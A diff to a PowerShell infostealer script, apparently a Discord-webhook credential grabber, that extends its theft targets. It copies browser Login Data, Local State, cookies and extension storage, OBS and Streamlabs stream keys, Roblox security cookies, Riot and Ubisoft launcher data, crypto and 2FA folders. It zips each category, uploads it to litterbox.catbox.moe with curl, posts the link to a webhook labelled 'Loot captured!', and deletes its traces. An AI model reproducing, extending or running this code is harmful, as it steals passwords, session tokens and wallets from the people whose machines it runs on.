@@ -84,12 +84,37 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 
 ############################################################################################################################################################
 
+New-Item -Path "$env:tmp/$FolderName/Streaming" -ItemType Directory
+
 # OBS
 $obs = Get-Childitem -Path $env:appdata\obs-studio\basic\profiles\ -Include service.json -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
 if ($obs -ne $null) {
 	New-Item -Path $env:tmp/$FolderName/OBS -ItemType Directory
 	Get-Content -Path $obs >> $env:tmp/$FolderName/OBS/service.json
 }
+
+# StreamlabsOBS
+if (Test-Path "$env:appdata/slobs-client/service.json" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/Streaming/StreamlabsOBS -ItemType Directory
+	Get-Content -Path "$env:appdata/slobs-client/service.json" >> $env:tmp/$FolderName/Streaming/StreamlabsOBS/service.json
+}
+
+Compress-Archive -Path $env:tmp/$FolderName/Streaming -DestinationPath "$env:tmp/Streaming-$ZIP"
+
+$text = "**Streaming**: Loot captured! Here is the URL (It expires in 12 hours): "
+$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/Streaming-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
+  'content' = $text
+}
+
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+
+Remove-Item "$env:TEMP\$FolderName\Streaming" -r -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\Streaming-$ZIP" -r -Force -ErrorAction SilentlyContinue
 
 ############################################################################################################################################################
 
@@ -109,7 +134,7 @@ if (Test-Path "$env:appdata/../Local/Syncthing/" -PathType Any) {
 
 Compress-Archive -Path $env:tmp/$FolderName/FTPandFileSync -DestinationPath "$env:tmp/FTPandFileSync-$ZIP"
 
-$text = "**FTPandFileSync**: Loot captured! Here is the URL: "
+$text = "**FTPandFileSync**: Loot captured! Here is the URL (It expires in 12 hours): "
 $text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/FTPandFileSync-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
 
 $hookurl = "$dc"
@@ -154,7 +179,7 @@ if (Test-Path "$env:appdata/Parsec/log.txt" -PathType Any) {
 
 Compress-Archive -Path $env:tmp/$FolderName/RemoteControl -DestinationPath "$env:tmp/RemoteControl-$ZIP"
 
-$text = "**RemoteControl**: Loot captured! Here is the URL: "
+$text = "**RemoteControl**: Loot captured! Here is the URL (It expires in 12 hours): "
 $text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/RemoteControl-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
 
 $hookurl = "$dc"
@@ -207,7 +232,7 @@ if ($utorrent -ne $null) {
 
 Compress-Archive -Path $env:tmp/$FolderName/TorrentsAndDownloaders -DestinationPath "$env:tmp/TorrentsAndDownloaders-$ZIP"
 
-$text = "**TorrentsAndDownloaders**: Loot captured! Here is the URL: "
+$text = "**TorrentsAndDownloaders**: Loot captured! Here is the URL (It expires in 12 hours): "
 $text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/TorrentsAndDownloaders-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
 
 $hookurl = "$dc"
@@ -334,7 +359,7 @@ if (Test-Path $path -PathType Any) {
 
 Compress-Archive -Path $env:tmp/$FolderName/Crypto -DestinationPath "$env:tmp/Crypto-$ZIP"
 
-$text = "**Crypto**: Loot captured! Here is the URL: "
+$text = "**Crypto**: Loot captured! Here is the URL (It expires in 12 hours): "
 $text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/Crypto-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
 
 $hookurl = "$dc"
@@ -381,7 +406,7 @@ if (Test-Path $path -PathType Any) {
 
 Compress-Archive -Path $env:tmp/$FolderName/2FA -DestinationPath "$env:tmp/2FA-$ZIP"
 
-$text = "**2FA**: Loot captured! Here is the URL: "
+$text = "**2FA**: Loot captured! Here is the URL (It expires in 12 hours): "
 $text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/2FA-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
 
 $hookurl = "$dc"
@@ -414,7 +439,7 @@ if (Test-Path "$env:appdata/../Local/Keybase/config.json" -PathType Any) {
 
 Compress-Archive -Path $env:tmp/$FolderName/Socials -DestinationPath "$env:tmp/Socials-$ZIP"
 
-$text = "**Socials**: Loot captured! Here is the URL: "
+$text = "**Socials**: Loot captured! Here is the URL (It expires in 12 hours): "
 $text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/Socials-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
 
 $hookurl = "$dc"
@@ -439,12 +464,18 @@ if ([System.IO.File]::Exists("$env:appdata/Battle.net/Battle.net.config")) {
 	Copy-Item "$env:appdata/Battle.net/Battle.net.config" "$env:tmp/$FolderName/Gaming/BattleNet/Battle.net.config"
 }
 
+# Ubisoft
+if (Test-Path "$env:appdata/../Ubisoft Game Launcher" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/Gaming/BattleNet -ItemType Directory
+	Copy-Item "$env:appdata/../Ubisoft Game Launcher" "env:tmp/$FolderName/Gaming/Ubisoft" -Recurse
+}
+
 # Roblox
 function get-RobloxCookies {
 	try {
 	$roblox = Get-ItemProperty -Path "HKCU:\Software\Roblox\RobloxStudioBrowser\roblox.com" 
-	$RBXID = roblox | Select-Object .RBXID | Format-Table -AutoSize -Wrap | Out-String
-	$RobloSec = roblox | Select-Object .ROBLOSECURITY | Format-Table -AutoSize -Wrap |Out-String
+	$RBXID = $roblox | Select-Object .RBXID | Format-Table -AutoSize -Wrap | Out-String
+	$RobloSec = $roblox | Select-Object .ROBLOSECURITY | Format-Table -AutoSize -Wrap |Out-String
 	$robloxCookies=$RobloSec+$RBXID
 	}
 
@@ -493,6 +524,16 @@ Copy-Item "$env:appdata/../Local/VALORANT/Saved/Logs" "$env:tmp/$FolderName/Gami
 if (Test-Path "$env:appdata/../Local/VALORANT/Saved/Config" -PathType Any) {
 Copy-Item "$env:appdata/../Local/VALORANT/Saved/Config" "$env:tmp/$FolderName/Gaming/Riot Games/Valorant" -Recurse
 }
+# LoL
+if (Test-Path "$env:appdata/../Local/Riot Games/League of Legends" -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Gaming/Riot Games/League of Legends" -ItemType Directory
+}
+if (Test-Path "$env:appdata/../Local/League of Legends/Saved/Logs" -PathType Any) {
+Copy-Item "$env:appdata/../Local/League of Legends/Saved/Logs" "$env:tmp/$FolderName/Gaming/Riot Games/League of Legends" -Recurse
+}
+if (Test-Path "$env:appdata/../Local/League of Legends/Saved/Config" -PathType Any) {
+Copy-Item "$env:appdata/../Local/League of Legends/Saved/Config" "$env:tmp/$FolderName/Gaming/Riot Games/League of Legends" -Recurse
+}
 # RiotClient
 if (Test-Path "$env:appdata\..\Local\Riot Games\Riot Client\Data" -PathType Any) {
 Copy-Item "$env:appdata/../Local/Riot Games/Riot Client/Data" "$env:tmp/$FolderName/Gaming/Riot Games/Riot Client" -Recurse
@@ -528,7 +569,7 @@ if ($minecraft -ne $null) {
 
 Compress-Archive -Path $env:tmp/$FolderName/Gaming -DestinationPath "$env:tmp/Gaming-$ZIP"
 
-$text = "**Gaming**: Loot captured! Here is the URL: "
+$text = "**Gaming**: Loot captured! Here is the URL (It expires in 12 hours): "
 $text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/Gaming-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
 
 $hookurl = "$dc"
@@ -555,7 +596,7 @@ tree $env:appdata /a /f >> $env:TEMP\$folderName\Trees\tree-appdata.txt
 
 Compress-Archive -Path $env:tmp/$FolderName/Trees -DestinationPath "$env:tmp/Trees-$ZIP"
 
-$text = "**Trees**: Loot captured! Here is the URL: "
+$text = "**Trees**: Loot captured! Here is the URL (It expires in 12 hours): "
 $text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/Trees-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
 
 $hookurl = "$dc"
@@ -976,6 +1017,8 @@ $output > $env:TEMP\$FolderName/computerData.txt
 
 ############################################################################################################################################################
 
+New-Item -Path "$env:tmp/$FolderName/Browsers" -ItemType Directory
+
 function Get-BrowserData {
 
     [CmdletBinding()]
@@ -1033,49 +1076,49 @@ function Get-BrowserData {
     } 
 }
 
-Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
+Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
 
-Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
+Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
 
-Get-BrowserData -Browser "chromebeta" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-Get-BrowserData -Browser "chromebeta" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "chromebeta" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
+Get-BrowserData -Browser "chromebeta" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
 
-Get-BrowserData -Browser "chromium" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-Get-BrowserData -Browser "chromium" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "chromium" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
+Get-BrowserData -Browser "chromium" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
 
-Get-BrowserData -Browser "360chrome" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-Get-BrowserData -Browser "360chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "360chrome" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
+Get-BrowserData -Browser "360chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
 
-Get-BrowserData -Browser "qqbrowser" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-Get-BrowserData -Browser "qqbrowser" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "qqbrowser" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
+Get-BrowserData -Browser "qqbrowser" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
 
-Get-BrowserData -Browser "vivaldi" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-Get-BrowserData -Browser "vivaldi" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "vivaldi" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
+Get-BrowserData -Browser "vivaldi" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
 
-Get-BrowserData -Browser "coccoc" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-Get-BrowserData -Browser "coccoc" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "coccoc" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
+Get-BrowserData -Browser "coccoc" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
 
-Get-BrowserData -Browser "dcbrowser" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-Get-BrowserData -Browser "dcbrowser" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "dcbrowser" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
+Get-BrowserData -Browser "dcbrowser" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
 
-Get-BrowserData -Browser "sogouexplorer" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-Get-BrowserData -Browser "sogouexplorer" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "sogouexplorer" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
+Get-BrowserData -Browser "sogouexplorer" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
 
-Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
+Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
 
-Get-BrowserData -Browser "operagx" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-Get-BrowserData -Browser "operagx" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "operagx" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
+Get-BrowserData -Browser "operagx" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
 
-Get-BrowserData -Browser "yandex" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-Get-BrowserData -Browser "yandex" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "yandex" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
+Get-BrowserData -Browser "yandex" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
 
-Get-BrowserData -Browser "brave" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-Get-BrowserData -Browser "brave" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "brave" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
+Get-BrowserData -Browser "brave" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
 
-Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
 
 function chromiumBrowser {
 	
@@ -1086,51 +1129,55 @@ function chromiumBrowser {
 	[Parameter (Position=1,Mandatory = $True)]
 	[string]$Browser
 	)
-New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
-Get-Content -Path "$path\User Data\Local State" > "$env:TMP\$FolderName\$Browser\Local State"
+New-Item -Path $env:tmp/$FolderName/Browsers/$Browser -ItemType Directory
+Get-Content -Path "$path\User Data\Local State" > "$env:TMP\$FolderName\Browsers\$Browser\Local State"
 if ([System.IO.File]::Exists("$path\User Data\default\Preferences")) {
-	New-Item -Path $env:tmp/$FolderName/$Browser/default -ItemType Directory
-	Get-Content -Path "$path\User Data\default\Web Data" > "$env:TMP\$FolderName\$Browser\default\Web Data"
-	Get-Content -Path "$path\User Data\default\Login Data" > "$env:TMP\$FolderName\$Browser\default\Login Data"
-	Get-Content -Path "$path\User Data\default\Preferences" > "$env:TMP\$FolderName\$Browser\default\Preferences"
-	Get-Content -Path "$path\User Data\default\Top Sites" > "$env:TMP\$FolderName\$Browser\default\Top Sites"
-	Get-Content -Path "$path\User Data\default\History" > "$env:TMP\$FolderName\$Browser\default\History"
-	Get-Content -Path "$path\User Data\default\Bookmarks" > "$env:TMP\$FolderName\$Browser\default\Bookmarks"
-	Copy-Item "$path\User Data\default\Local Storage\leveldb" "$env:TMP\$FolderName\$Browser\default\Local Storage\leveldb" -Recurse
-	Copy-Item "$path\User Data\default\Sync Data\leveldb" "$env:TMP\$FolderName\$Browser\default\Sync Data\leveldb" -Recurse
+	New-Item -Path $env:tmp/$FolderName/Browsers/$Browser/default -ItemType Directory
+	Get-Content -Path "$path\User Data\default\Web Data" > "$env:TMP\$FolderName\Browsers\$Browser\default\Web Data"
+	Get-Content -Path "$path\User Data\default\Login Data" > "$env:TMP\$FolderName\Browsers\$Browser\default\Login Data"
+	Get-Content -Path "$path\User Data\default\Preferences" > "$env:TMP\$FolderName\Browsers\$Browser\default\Preferences"
+	Get-Content -Path "$path\User Data\default\Top Sites" > "$env:TMP\$FolderName\Browsers\$Browser\default\Top Sites"
+	Get-Content -Path "$path\User Data\default\History" > "$env:TMP\$FolderName\Browsers\$Browser\default\History"
+	Get-Content -Path "$path\User Data\default\Bookmarks" > "$env:TMP\$FolderName\Browsers\$Browser\default\Bookmarks"
+	Copy-Item "$path\User Data\default\Local Storage\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\default\Local Storage\leveldb" -Recurse
+	Copy-Item "$path\User Data\default\Local Extension Settings" "$env:TMP\$FolderName\Browsers\$Browser\default\Local Extension Settings" -Recurse
+	Copy-Item "$path\User Data\default\Sync Data\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\default\Sync Data\leveldb" -Recurse
 }
 if ([System.IO.File]::Exists("$path\User Data\Profile 1\Preferences")) {
-	New-Item -Path $env:tmp/$FolderName/$Browser/Profile 1 -ItemType Directory
-	Get-Content -Path "$path\User Data\Profile 1\Web Data" > "$env:TMP\$FolderName\$Browser\Profile 1\Web Data"
-	Get-Content -Path "$path\User Data\Profile 1\Login Data" > "$env:TMP\$FolderName\$Browser\Profile 1\Login Data"
-	Get-Content -Path "$path\User Data\Profile 1\Preferences" > "$env:TMP\$FolderName\$Browser\Profile 1\Preferences"
-	Get-Content -Path "$path\User Data\Profile 1\Top Sites" > "$env:TMP\$FolderName\$Browser\Profile 1\Top Sites"
-	Get-Content -Path "$path\User Data\Profile 1\History" > "$env:TMP\$FolderName\$Browser\Profile 1\History"
-	Get-Content -Path "$path\User Data\Profile 1\Bookmarks" > "$env:TMP\$FolderName\$Browser\Profile 1\Bookmarks"
-	Copy-Item "$path\User Data\Profile 1\Local Storage\leveldb" "$env:TMP\$FolderName\$Browser\Profile 1\Local Storage\leveldb" -Recurse
-	Copy-Item "$path\User Data\Profile 1\Sync Data\leveldb" "$env:TMP\$FolderName\$Browser\Profile 1\Sync Data\leveldb" -Recurse
+	New-Item -Path $env:tmp/$FolderName/Browsers/$Browser/Profile 1 -ItemType Directory
+	Get-Content -Path "$path\User Data\Profile 1\Web Data" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Web Data"
+	Get-Content -Path "$path\User Data\Profile 1\Login Data" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Login Data"
+	Get-Content -Path "$path\User Data\Profile 1\Preferences" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Preferences"
+	Get-Content -Path "$path\User Data\Profile 1\Top Sites" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Top Sites"
+	Get-Content -Path "$path\User Data\Profile 1\History" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\History"
+	Get-Content -Path "$path\User Data\Profile 1\Bookmarks" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Bookmarks"
+	Copy-Item "$path\User Data\Profile 1\Local Storage\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Local Storage\leveldb" -Recurse
+	Copy-Item "$path\User Data\Profile 1\Local Extension Settings" "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Local Extension Settings" -Recurse
+	Copy-Item "$path\User Data\Profile 1\Sync Data\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Sync Data\leveldb" -Recurse
 }
 if ([System.IO.File]::Exists("$path\User Data\Profile 2\Preferences")) {
-	New-Item -Path $env:tmp/$FolderName/$Browser/Profile 2 -ItemType Directory
-	Get-Content -Path "$path\User Data\Profile 2\Web Data" > "$env:TMP\$FolderName\$Browser\Profile 2\Web Data"
-	Get-Content -Path "$path\User Data\Profile 2\Login Data" > "$env:TMP\$FolderName\$Browser\Profile 2\Login Data"
-	Get-Content -Path "$path\User Data\Profile 2\Preferences" > "$env:TMP\$FolderName\$Browser\Profile 2\Preferences"
-	Get-Content -Path "$path\User Data\Profile 2\Top Sites" > "$env:TMP\$FolderName\$Browser\Profile 2\Top Sites"
-	Get-Content -Path "$path\User Data\Profile 2\History" > "$env:TMP\$FolderName\$Browser\Profile 2\History"
-	Get-Content -Path "$path\User Data\Profile 2\Bookmarks" > "$env:TMP\$FolderName\$Browser\Profile 2\Bookmarks"
-	Copy-Item "$path\User Data\Profile 2\Local Storage\leveldb" "$env:TMP\$FolderName\$Browser\Profile 2\Local Storage\leveldb" -Recurse
-	Copy-Item "$path\User Data\Profile 2\Sync Data\leveldb" "$env:TMP\$FolderName\$Browser\Profile 2\Sync Data\leveldb" -Recurse
+	New-Item -Path $env:tmp/$FolderName/Browsers/$Browser/Profile 2 -ItemType Directory
+	Get-Content -Path "$path\User Data\Profile 2\Web Data" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Web Data"
+	Get-Content -Path "$path\User Data\Profile 2\Login Data" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Login Data"
+	Get-Content -Path "$path\User Data\Profile 2\Preferences" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Preferences"
+	Get-Content -Path "$path\User Data\Profile 2\Top Sites" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Top Sites"
+	Get-Content -Path "$path\User Data\Profile 2\History" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\History"
+	Get-Content -Path "$path\User Data\Profile 2\Bookmarks" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Bookmarks"
+	Copy-Item "$path\User Data\Profile 2\Local Storage\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Local Storage\leveldb" -Recurse
+	Copy-Item "$path\User Data\Profile 2\Local Extension Settings" "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Local Extension Settings" -Recurse
+	Copy-Item "$path\User Data\Profile 2\Sync Data\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Sync Data\leveldb" -Recurse
 }
 if ([System.IO.File]::Exists("$path\User Data\Profile 3\Preferences")) {
-	New-Item -Path $env:tmp/$FolderName/$Browser/Profile 3 -ItemType Directory
-	Get-Content -Path "$path\User Data\Profile 3\Web Data" > "$env:TMP\$FolderName\$Browser\Profile 3\Web Data"
-	Get-Content -Path "$path\User Data\Profile 3\Login Data" > "$env:TMP\$FolderName\$Browser\Profile 3\Login Data"
-	Get-Content -Path "$path\User Data\Profile 3\Preferences" > "$env:TMP\$FolderName\$Browser\Profile 3\Preferences"
-	Get-Content -Path "$path\User Data\Profile 3\Top Sites" > "$env:TMP\$FolderName\$Browser\Profile 3\Top Sites"
-	Get-Content -Path "$path\User Data\Profile 3\History" > "$env:TMP\$FolderName\$Browser\Profile 3\History"
-	Get-Content -Path "$path\User Data\Profile 3\Bookmarks" > "$env:TMP\$FolderName\$Browser\Profile 3\Bookmarks"
-	Copy-Item "$path\User Data\Profile 3\Local Storage\leveldb" "$env:TMP\$FolderName\$Browser\Profile 3\Local Storage\leveldb" -Recurse
-	Copy-Item "$path\User Data\Profile 3\Sync Data\leveldb" "$env:TMP\$FolderName\$Browser\Profile 3\Sync Data\leveldb" -Recurse
+	New-Item -Path $env:tmp/$FolderName/Browsers/$Browser/Profile 3 -ItemType Directory
+	Get-Content -Path "$path\User Data\Profile 3\Web Data" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Web Data"
+	Get-Content -Path "$path\User Data\Profile 3\Login Data" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Login Data"
+	Get-Content -Path "$path\User Data\Profile 3\Preferences" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Preferences"
+	Get-Content -Path "$path\User Data\Profile 3\Top Sites" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Top Sites"
+	Get-Content -Path "$path\User Data\Profile 3\History" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\History"
+	Get-Content -Path "$path\User Data\Profile 3\Bookmarks" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Bookmarks"
+	Copy-Item "$path\User Data\Profile 3\Local Storage\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Local Storage\leveldb" -Recurse
+	Copy-Item "$path\User Data\Profile 3\Local Extension Settings" "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Local Extension Settings" -Recurse
+	Copy-Item "$path\User Data\Profile 3\Sync Data\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Sync Data\leveldb" -Recurse
 }
 
 }
@@ -1214,51 +1261,51 @@ if([System.IO.File]::Exists("$path\Local State")){
 taskkill /IM sogou.exe /F
 Start-Sleep 1
 $Browser="Sogou"
-New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
-Get-Content -Path "$path\Local State" > "$env:TMP\$FolderName\$Browser\Local State"
+New-Item -Path $env:tmp/$FolderName/Browsers/$Browser -ItemType Directory
+Get-Content -Path "$path\Local State" > "$env:TMP\$FolderName\Browsers\$Browser\Local State"
 if ([System.IO.File]::Exists("$path\User Data\default\Preferences")) {
-	New-Item -Path $env:tmp/$FolderName/$Browser/default -ItemType Directory
-	Get-Content -Path "$path\default\Web Data" > "$env:TMP\$FolderName\$Browser\default\Web Data"
-	Get-Content -Path "$path\default\Login Data" > "$env:TMP\$FolderName\$Browser\default\Login Data"
-	Get-Content -Path "$path\default\Preferences" > "$env:TMP\$FolderName\$Browser\default\Preferences"
-	Get-Content -Path "$path\default\Top Sites" > "$env:TMP\$FolderName\$Browser\default\Top Sites"
-	Get-Content -Path "$path\default\History" > "$env:TMP\$FolderName\$Browser\default\History"
-	Get-Content -Path "$path\default\Bookmarks" > "$env:TMP\$FolderName\$Browser\default\Bookmarks"
-	Copy-Item "$path\default\Local Storage\leveldb" "$env:TMP\$FolderName\$Browser\default\Local Storage\leveldb" -Recurse
-	Copy-Item "$path\default\Sync Data\leveldb" "$env:TMP\$FolderName\$Browser\default\Sync Data\leveldb" -Recurse
+	New-Item -Path $env:tmp/$FolderName/Browsers/$Browser/default -ItemType Directory
+	Get-Content -Path "$path\default\Web Data" > "$env:TMP\$FolderName\Browsers\$Browser\default\Web Data"
+	Get-Content -Path "$path\default\Login Data" > "$env:TMP\$FolderName\Browsers\$Browser\default\Login Data"
+	Get-Content -Path "$path\default\Preferences" > "$env:TMP\$FolderName\Browsers\$Browser\default\Preferences"
+	Get-Content -Path "$path\default\Top Sites" > "$env:TMP\$FolderName\Browsers\$Browser\default\Top Sites"
+	Get-Content -Path "$path\default\History" > "$env:TMP\$FolderName\Browsers\$Browser\default\History"
+	Get-Content -Path "$path\default\Bookmarks" > "$env:TMP\$FolderName\Browsers\$Browser\default\Bookmarks"
+	Copy-Item "$path\default\Local Storage\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\default\Local Storage\leveldb" -Recurse
+	Copy-Item "$path\default\Sync Data\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\default\Sync Data\leveldb" -Recurse
 }
 if ([System.IO.File]::Exists("$path\Profile 1\Preferences")) {
-	New-Item -Path $env:tmp/$FolderName/$Browser/Profile 1 -ItemType Directory
-	Get-Content -Path "$path\Profile 1\Web Data" > "$env:TMP\$FolderName\$Browser\Profile 1\Web Data"
-	Get-Content -Path "$path\Profile 1\Login Data" > "$env:TMP\$FolderName\$Browser\Profile 1\Login Data"
-	Get-Content -Path "$path\Profile 1\Preferences" > "$env:TMP\$FolderName\$Browser\Profile 1\Preferences"
-	Get-Content -Path "$path\Profile 1\Top Sites" > "$env:TMP\$FolderName\$Browser\Profile 1\Top Sites"
-	Get-Content -Path "$path\Profile 1\History" > "$env:TMP\$FolderName\$Browser\Profile 1\History"
-	Get-Content -Path "$path\Profile 1\Bookmarks" > "$env:TMP\$FolderName\$Browser\Profile 1\Bookmarks"
-	Copy-Item "$path\Profile 1\Local Storage\leveldb" "$env:TMP\$FolderName\$Browser\Profile 1\Local Storage\leveldb" -Recurse
-	Copy-Item "$path\Profile 1\Sync Data\leveldb" "$env:TMP\$FolderName\$Browser\Profile 1\Sync Data\leveldb" -Recurse
+	New-Item -Path $env:tmp/$FolderName/Browsers/$Browser/Profile 1 -ItemType Directory
+	Get-Content -Path "$path\Profile 1\Web Data" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Web Data"
+	Get-Content -Path "$path\Profile 1\Login Data" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Login Data"
+	Get-Content -Path "$path\Profile 1\Preferences" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Preferences"
+	Get-Content -Path "$path\Profile 1\Top Sites" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Top Sites"
+	Get-Content -Path "$path\Profile 1\History" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\History"
